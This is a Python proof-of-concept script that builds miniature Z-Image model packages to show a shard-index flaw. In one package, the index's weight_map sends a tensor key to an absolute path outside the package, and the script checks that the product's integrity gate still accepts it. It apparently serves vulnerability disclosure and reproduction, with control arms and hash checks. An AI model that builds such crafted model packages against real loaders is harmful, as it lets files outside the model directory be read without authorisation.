#!/usr/bin/env python
"""make_poc.py -- build the miniature Z-Image model packages used by the PoC.

Three packages are produced. They are full model directories named `Z-Image-Turbo`
(that name matters: `src/utils/helpers.py:162-167` auto-detects the product manifest
`src/config/manifests/z-image-turbo.txt` from the directory name), and each of them
contains every file listed in that manifest, so the product's own integrity gate
(`ensure_model_weights(..., verify=False)`, the call `inference.py:15` makes) accepts
them.

    out/positive/Z-Image-Turbo
        transformer/diffusion_pytorch_model.safetensors.index.json maps
        weight_map["x_pad_token"] to the ABSOLUTE path
        /victim_private/secret_model.safetensors, i.e. outside the package.

    out/negative/Z-Image-Turbo
        the same package; the only index delta is that the same key names the
        in-package shard diffusion_pytorch_model-00003-of-00003.safetensors.

    out/missing/Z-Image-Turbo
        the same package; the same key names the ABSOLUTE path
        /victim_private/does-not-exist.safetensors (missing-file control).

The transformer component is a real (miniature) ZImageTransformer2DModel: the shard
tensors are generated from the model's own state_dict shapes, so only the model is
small, not the code path. `x_pad_token` is a direct parameter of that model with
shape (1, dim); the victim-side file carries (2, dim) so that the loader's report
shows which file was actually parsed.

Paths are taken from the environment so that the script also runs outside the
reproduction container: `ZIMAGE_SRC` (default `/opt/Z-Image/src`, the pinned product
source) and `ZIMAGE_VICTIM_DIR` (default `/victim_private`, the directory that holds
the "victim" SafeTensors file outside the model package).
"""

import hashlib
import json
import os
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
SRC = Path(os.environ.get("ZIMAGE_SRC", "/opt/Z-Image/src"))
VICTIM_DIR = Path(os.environ.get("ZIMAGE_VICTIM_DIR", "/victim_private"))
OUT = HERE / "out"

ARM_TARGETS = {
    # arm name: value written to weight_map["x_pad_token"]
    "positive": str(VICTIM_DIR / "secret_model.safetensors"),
    "negative": "diffusion_pytorch_model-00003-of-00003.safetensors",
    "missing": str(VICTIM_DIR / "does-not-exist.safetensors"),
}

# Miniature but structurally valid DiT config (head_dim = dim / n_heads must equal
# sum(axes_dims); see src/zimage/transformer.py:338-339).
TINY_CONFIG = {
    "all_patch_size": [2],
    "all_f_patch_size": [1],
    "in_channels": 2,
    "dim": 13,
    "n_layers": 1,
    "n_refiner_layers": 1,
    "n_heads": 1,
    "n_kv_heads": 1,
    "norm_eps": 1e-05,
    "qk_norm": True,
    "cap_feat_dim": 2,
    "rope_theta": 256.0,
    "t_scale": 1000.0,
    "axes_dims": [4, 4, 5],
    "axes_lens": [8, 8, 8],
}

SHARDS = [f"diffusion_pytorch_model-0000{i}-of-00003.safetensors" for i in (1, 2, 3)]
PAD_KEY = "x_pad_token"


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def banner(title):
    print("")
    print("=" * 78)
    print(title)
    print("=" * 78)


def manifest_entries():
    manifest = SRC / "config" / "manifests" / "z-image-turbo.txt"
    entries = []
    for line in manifest.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split()
        entries.append(parts[1] if len(parts) == 2 else parts[0])
    return manifest, entries


def build_model_shapes():
    """State-dict shapes of the miniature product model, built on the meta device."""
    import torch
    from zimage.transformer import ZImageTransformer2DModel

    with torch.device("meta"):
        model = ZImageTransformer2DModel(
            all_patch_size=tuple(TINY_CONFIG["all_patch_size"]),
            all_f_patch_size=tuple(TINY_CONFIG["all_f_patch_size"]),
            in_channels=TINY_CONFIG["in_channels"],
            dim=TINY_CONFIG["dim"],
            n_layers=TINY_CONFIG["n_layers"],
            n_refiner_layers=TINY_CONFIG["n_refiner_layers"],
            n_heads=TINY_CONFIG["n_heads"],
            n_kv_heads=TINY_CONFIG["n_kv_heads"],
            norm_eps=TINY_CONFIG["norm_eps"],
            qk_norm=TINY_CONFIG["qk_norm"],
            cap_feat_dim=TINY_CONFIG["cap_feat_dim"],
            rope_theta=TINY_CONFIG["rope_theta"],
            t_scale=TINY_CONFIG["t_scale"],
            axes_dims=TINY_CONFIG["axes_dims"],
            axes_lens=TINY_CONFIG["axes_lens"],
        )
    return {k: tuple(v.shape) for k, v in model.state_dict().items()}


def build_base_shards(shapes):
    """In-package shards shared by all arms (x_pad_token is not among them)."""
    import torch

    keys = sorted(k for k in shapes if k != PAD_KEY)
    shards = {name: {} for name in SHARDS}
    for i, key in enumerate(keys):
        shards[SHARDS[i % len(SHARDS)]][key] = torch.zeros(shapes[key], dtype=torch.bfloat16)
    return shards


def write_package(arm, shapes, base_shards):
    """Materialise one model package and return {relative path: sha256}."""
    import shutil

    import torch
    from safetensors.torch import save_file

    root = OUT / arm / "Z-Image-Turbo"
    if root.exists():
        shutil.rmtree(root)
    for sub in ("", "scheduler", "text_encoder", "tokenizer", "transformer", "vae"):
        (root / sub).mkdir(parents=True, exist_ok=True)

    # --- transformer: the real component ---------------------------------------------
    (root / "transformer" / "config.json").write_text(json.dumps(TINY_CONFIG, indent=2), encoding="utf-8")
    shards = {name: dict(tensors) for name, tensors in base_shards.items()}
    if arm == "negative":  # the redirected tensor lives in the package in this arm only
        shards[SHARDS[-1]][PAD_KEY] = torch.zeros(shapes[PAD_KEY], dtype=torch.bfloat16)
    for name in SHARDS:
        save_file(shards[name], str(root / "transformer" / name))

    weight_map = {}
    for name in SHARDS:
        for key in shards[name]:
            weight_map[key] = name
    weight_map[PAD_KEY] = ARM_TARGETS[arm]
    index = {
        "metadata": {"total_size": sum((root / "transformer" / n).stat().st_size for n in SHARDS)},
        "weight_map": dict(sorted(weight_map.items())),
    }
    (root / "transformer" / "diffusion_pytorch_model.safetensors.index.json").write_text(
        json.dumps(index, indent=2), encoding="utf-8"
    )

    # --- remaining components: placeholders (never reached by this PoC) --------------
    (root / "model_index.json").write_text(
        json.dumps({"_class_name": "ZImagePipeline", "_diffusers_version": "0.35.0"}, indent=2),
        encoding="utf-8",
    )
    (root / "scheduler" / "scheduler_config.json").write_text(
        json.dumps({"num_train_timesteps": 1000, "shift": 3.0, "use_dynamic_shifting": False}, indent=2),
        encoding="utf-8",
    )
    (root / "text_encoder" / "config.json").write_text(
        json.dumps({"model_type": "qwen2", "_name_or_path": "placeholder"}, indent=2), encoding="utf-8"
    )
    for name in ("model-00001-of-00003.safetensors", "model-00002-of-00003.safetensors",
                 "model-00003-of-00003.safetensors"):
        save_file({}, str(root / "text_encoder" / name))
    (root / "text_encoder" / "model.safetensors.index.json").write_text(
        json.dumps({"metadata": {"total_size": 0}, "weight_map": {}}, indent=2), encoding="utf-8"
    )
    (root / "tokenizer" / "tokenizer.json").write_text(
        json.dumps({"version": "1.0", "model": {"type": "BPE", "vocab": {}, "merges": []},
                    "added_tokens": []}, indent=2), encoding="utf-8"
    )
    (root / "tokenizer" / "tokenizer_config.json").write_text(
        json.dumps({"tokenizer_class": "Qwen2Tokenizer"}, indent=2), encoding="utf-8"
    )
    (root / "vae" / "config.json").write_text(
        json.dumps({"in_channels": 3, "out_channels": 3, "down_block_types": ["DownEncoderBlock2D"],
                    "up_block_types": ["UpDecoderBlock2D"], "block_out_channels": [4],
                    "layers_per_block": 1, "latent_channels": 2, "norm_num_groups": 1,
                    "scaling_factor": 0.18215}, indent=2), encoding="utf-8"
    )
    save_file({}, str(root / "vae" / "diffusion_pytorch_model.safetensors"))

    return {p.relative_to(root).as_posix(): sha256(p) for p in sorted(root.rglob("*")) if p.is_file()}


def main():
    import torch
    from safetensors.torch import save_file

    sys.path.insert(0, str(SRC))

    banner("Z-Image shard-index PoC -- building the model packages")
    print(f"[build] product source : {SRC}")
    print(f"[build] output root    : {OUT}")
    print(f"[build] victim dir     : {VICTIM_DIR}")

    shapes = build_model_shapes()
    base_shards = build_base_shards(shapes)
    print(f"[build] miniature ZImageTransformer2DModel: {len(shapes)} tensors, "
          f"{PAD_KEY} shape {shapes[PAD_KEY]}")

    # victim-side file: a legitimate SafeTensors file OUTSIDE the model package
    VICTIM_DIR.mkdir(parents=True, exist_ok=True)
    victim_file = VICTIM_DIR / "secret_model.safetensors"
    victim_shape = (2, shapes[PAD_KEY][1])
    save_file({PAD_KEY: torch.zeros(victim_shape, dtype=torch.bfloat16)}, str(victim_file))
    print(f"[build] victim tensor  : {victim_file}  {PAD_KEY} shape {victim_shape}")

    hashes = {}
    for arm in ARM_TARGETS:
        hashes[arm] = write_package(arm, shapes, base_shards)
        print(f"[build] package built  : {arm:<8} -> {OUT / arm / 'Z-Image-Turbo'}")

    # --- assertions ------------------------------------------------------------------
    banner("consistency checks")
    manifest, entries = manifest_entries()
    for arm in ARM_TARGETS:
        root = OUT / arm / "Z-Image-Turbo"
        missing = [p for p in entries if not (root / p).is_file()]
        assert not missing, f"{arm}: manifest entries missing: {missing}"
        print(f"[check] {arm:<8} contains all {len(entries)} files of {manifest.relative_to(SRC)}")

    indexes = {}
    for arm in ARM_TARGETS:
        p = OUT / arm / "Z-Image-Turbo" / "transformer" / "diffusion_pytorch_model.safetensors.index.json"
        indexes[arm] = json.loads(p.read_text(encoding="utf-8"))
    base = dict(indexes["positive"]["weight_map"])
    base.pop(PAD_KEY)
    for arm in ("negative", "missing"):
        other = dict(indexes[arm]["weight_map"])
        target = other.pop(PAD_KEY)
        assert other == base, f"{arm}: weight_map differs from positive beyond {PAD_KEY}"
        print(f"[check] index delta positive vs {arm:<8}: exactly 1 of "
              f"{len(indexes[arm]['weight_map'])} values -> {target}")

    for name in SHARDS[:2]:
        digests = {hashes[arm][f"transformer/{name}"] for arm in ARM_TARGETS}
        assert len(digests) == 1, f"{name} is not identical across arms"
        print(f"[check] {name}: same SHA-256 in all three packages "
              f"({digests.pop()[:16]}...)")
    third = [hashes[arm][f"transformer/{SHARDS[2]}"] for arm in ARM_TARGETS]
    assert third[0] == third[2] and third[0] != third[1], "shard 3 delta is not what the PoC claims"
    print(f"[check] {SHARDS[2]}: identical for positive/missing ({third[0][:16]}...), "
          f"negative differs by the tensor {PAD_KEY} ({third[1][:16]}...)")
    index_hashes = [hashes[arm]["transformer/diffusion_pytorch_model.safetensors.index.json"]
                    for arm in ARM_TARGETS]
    assert len(set(index_hashes)) == 3
    print(f"[check] index.json: three different files "
          f"({', '.join(h[:12] + '...' for h in index_hashes)})")
    print(f"[check] index.json: one value differs -- weight_map[{PAD_KEY!r}]")

    # --- hashes ----------------------------------------------------------------------
    lines = []
    for arm in ARM_TARGETS:
        for rel, digest in hashes[arm].items():
            lines.append(f"{digest}  out/{arm}/Z-Image-Turbo/{rel}")
    lines.append(f"{sha256(victim_file)}  {victim_file}")
    tarball = HERE / "Z-Image-26f23ed.tar.gz"
    if tarball.is_file():
        lines.append(f"{sha256(tarball)}  {tarball.name}")
    (HERE / "SHA256SUMS.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"[build] SHA256SUMS.txt : {len(lines)} entries")

    banner("summary")
    for arm, target in ARM_TARGETS.items():
        print(f"  {arm:<8} weight_map[{PAD_KEY!r}] = {target}")
    print("  packages differ only in that one index value (and, for 'negative', the presence")
    print("  of that one tensor in the in-package shard)")
    print("  next: run_poc.py gate|shard|load out/positive/Z-Image-Turbo")
    return 0


if __name__ == "__main__":
    sys.exit(main())
